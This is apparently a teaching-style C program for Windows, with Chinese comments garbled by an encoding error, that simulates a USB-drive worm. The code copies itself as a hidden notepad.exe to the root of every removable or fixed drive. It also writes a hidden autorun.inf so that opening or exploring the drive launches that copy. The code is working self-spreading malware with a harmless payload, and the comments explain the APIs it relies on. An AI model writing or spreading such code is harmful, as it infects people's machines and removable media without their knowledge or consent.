#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
/*
	U�̲���ԭ��:
	U�̲�����Ҫ������AutoRun.inf�ļ�.���ļ������������������(����˫������AutoRun.inf�ļ����������̷�)ʱ�Զ�����ָ����ĳ���ļ�.
*/
/*
	ʵ�ֹ���:ģ��U�̲���ʵ��һ����򵥵Ĺ���,���ƶ�����(DRIVE_REMOVEABLE���͵ķ���)�򱾵ش���(DRIVER_FIXED���͵ķ���)�ϴ���AutoRun.inf�ļ�,
	��Ҫ�����������̷��ĸ�Ŀ¼��
*/
/*
	1. �ļ��Ĵ򿪺͹ر�
		���ļ�:HANDLE WINAPI CreateFile(
			LPCTSTR lpFileName, //��ͨ�ļ��������豸�ļ���
			DWORD dwDesiredAccess, //����ģʽ��д/����
			DWORD dwShareMode, //����ģʽ
			LPSECURITY_ATTRIBUTES lpSecurityAttributes, //ָ��ȫ���Ե�ָ��
			DWORD dwCreationDisposition, //��δ���
			DWORD dwFlagsAndAttributes, //�ļ�����
			HANDLE hTemplateFile //���ڸ����ļ����
			);

		
	�ر�:CloseHandle(Handle hObject)
		�ú������������ر��ļ�,�¼�,����,�̵߳Ⱦ��
	2. ��ȡ���������߼�����������
		DWORD GetLogicalDriveStrings(DWORD length,LPTSTR lpBuffer);
		length:��ʾbuffer�ĳ���
		buffer:���ձ����߼����������Ļ�����
		����ֵ��
		�����ķ���ֵָ���˺��������Ƿ�ɹ�������ɹ��򷵻ػ������з��ؽ�����ܳ��ȣ��������ֵ����nBufferLength��˵�������Ļ�������С����������ֵ��ʵ����Ҫ�Ĵ�С���������0����˵���������г���
		˵����
		�������óɹ��󣬽��ڻ��������������뱾�������е���������·���ַ���������ϵͳ����4���߼���������C:\������D:\������E:\������F:\����
	3. ��ȡ���������ͺ���:
		UINT GetDriveType(LPCTSTR lpRootPathName); 
		lpRootPathName:��������,��"C:\"
	4. �����ļ�����
		BOOL CopyFile(LPCTSTR lpExistingFileName,LPCTSTR lpNewFileName,BOOL bFailIfExists );
		lpExistingFileName String��Դ�ļ���
		lpNewFileName String��Ŀ���ļ���
		bFailIfExists Long�������ΪTRUE�����㣩����ôһ��Ŀ���ļ��Ѿ����ڣ��������û�ʧ�ܡ�����Ŀ���ļ�����д
*/
// ��\����ʵ���ַ���������д,\r\n����
char autoRun[] = "[AutoRun] \
\r\nopen = notepad.exe \
\r\nshell\\open = ��(&O)\
\r\nshell\\open\\Command = notepad.exe\
\r\nshell\\explore = ��Դ������\
\r\nshell\\explore\\Command = notepad.exe\
\r\nshellexecute = notepad.exe\
\r\nshell\\Auto\\Command = notepad.exe\
";
void infect(char *pFile, UINT uDriverType) {
	char driverString[MAXBYTE] = { 0 };
	DWORD dwReturn = 0;
	DWORD number = 0;
	char root[4] = { 0 };
	UINT type = 0;
	char target[MAX_PATH] = { 0 };

	dwReturn = GetLogicalDriveStrings(MAXBYTE,driverString);
	printf("����������:%s\n", driverString);

	while (number < dwReturn)
	{
		strncpy(root, &driverString[number], 3);

		// ��ȡ����������
		type = GetDriveType(root);

		if (type == uDriverType) {
			// �����ļ�
			lstrcpy(target, root); //�ú��������ַ���A��������B��
			lstrcat(target, "notepad.exe");
			// ��pFile������target,������ھ͸���
			CopyFile(pFile, target, FALSE);

			// ����notepad.exe�ļ�Ϊ��������
			SetFileAttributes(target, FILE_ATTRIBUTE_HIDDEN);

			// ����AutoRun.inf�ļ�
			lstrcpy(target, root);
			lstrcat(target, "autorun.inf");
			HANDLE hFile = CreateFile(target, GENERIC_WRITE,0,NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
			DWORD dwWritten = 0;
			WriteFile(hFile, autoRun, lstrlen(autoRun), &dwWritten, NULL);

			CloseHandle(hFile);
			// ����AutoRun.inf�ļ�Ϊ��������
			SetFileAttributes(target, FILE_ATTRIBUTE_HIDDEN);
		}
		number += 4;
	}
}
int main() {
	// ��������λ��
	char szFileName[MAX_PATH] = { 0 };
	// ���浱ǰ�ļ����ڵ��̷�
	char szRoot[4] = { 0 };
	// �����������
	UINT uType = 0;

	// ��ȡ��ǰ��������·�����ļ���
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	printf("%s\n", szFileName);
	// ��ȡ�����̷�
	strncpy(szRoot, szFileName, 3);
	uType = GetDriveType(szRoot);
	switch (uType) {
	case DRIVE_FIXED:
		// �������Ӳ���Ͼͼ��һ���Ƿ����ƶ�����
		infect(szFileName, DRIVE_REMOVABLE);
		break;
	case DRIVE_REMOVABLE:
		// ������ƶ�������,���Լ����Ƶ�Ӳ����
		infect(szFileName, DRIVE_FIXED);
		break;
	}

	system("pause");
	return 0;
}